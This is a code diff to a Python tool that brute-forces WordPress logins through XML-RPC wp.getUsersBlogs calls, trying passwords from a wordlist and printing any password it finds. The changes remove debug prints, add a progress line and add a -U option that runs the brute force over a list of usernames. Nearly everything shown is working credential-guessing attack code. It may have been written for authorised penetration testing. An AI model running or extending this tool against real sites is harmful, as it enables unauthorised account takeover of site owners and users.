@@ -203,7 +203,6 @@ def user_reuse(url, user, time_sleep, u_agent, admin_page, department):
                 sys.exit(1)
             except:
                 print("An error as occured")
-            print(dur_d)
         datas = '''<methodCall>
                 <methodName>wp.getUsersBlogs</methodName>
                 <params>
@@ -222,7 +221,6 @@ def user_reuse(url, user, time_sleep, u_agent, admin_page, department):
             print(url)
             print(req.text)
         time.sleep(float(time_sleep))
-        print(dur)
         if "Incorrect" in req.text or "incorrect" in req.text or req.status_code == 403:
             pass
         elif any(wa in req.text for wa in words_alert):
@@ -241,6 +239,8 @@ def user_reuse(url, user, time_sleep, u_agent, admin_page, department):
                 else:
                     print("{}password found: {}".format(PLUS, dur))
                     sys.exit()
+        sys.stdout.write("\033[34m[i] {}\033[0m\r".format(dur))
+        sys.stdout.write("\033[K")
 
 
 
@@ -272,7 +272,6 @@ def bf_user(url, wordlist, user, time_sleep, u_agent, admin_page, department):
                 print(url)
                 print(req.text)
             time.sleep(float(time_sleep))
-            print(d)
             if "Incorrect" in req.text or "incorrect" in req.text or req.status_code == 403:
                 pass
             elif any(wa in req.text for wa in words_alert):
@@ -316,9 +315,14 @@ def main(url, url_xmlrpc, wordlist, user, time_sleep, u_agent, department):
         print("{}pingback.ping function found ! \n".format(PLUS))
 
     #if username is know
-    if user and try_method:
-        url = "{}xmlrpc.php".format(url)
-        bf_user(url, wordlist, user, time_sleep, u_agent, admin_page, department)
+    if user and try_method or user_list:
+        if user_list:
+            with open(user_list, "r+") as ul:
+                ul = ul.read().splitlines()
+                for user_l in ul:
+                    bf_user(url_xmlrpc, wordlist, user_l, time_sleep, u_agent, admin_page, department)
+        else:
+            bf_user(url, wordlist, user, time_sleep, u_agent, admin_page, department)
     else:
         print("{}Search users: ".format(INFO))
         su = search_users(url, wordlist, user, time_sleep, u_agent, admin_page, try_method)
@@ -375,6 +379,7 @@ def main(url, url_xmlrpc, wordlist, user, time_sleep, u_agent, department):
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument("-u", help="URL to scan [required]", dest='url')
+    parser.add_argument("-U", help="Users list", dest='user_list')
     parser.add_argument("-w", help="Wordlist used for URL Fuzzing [required]", dest='wordlist', default="passwd.txt")
     parser.add_argument("-s", help="timesleep if it's must fast", default=0, dest='time_sleep')
     parser.add_argument("--user", help="if you know the user", required=False, dest='user')
@@ -390,6 +395,7 @@ if __name__ == '__main__':
     u_agent = results.user_agent
     rs = results.read_source
     department = results.department
+    user_list = results.user_list
 
     if "/" not in url.split(".")[-1]:
         url = "{}/".format(url)
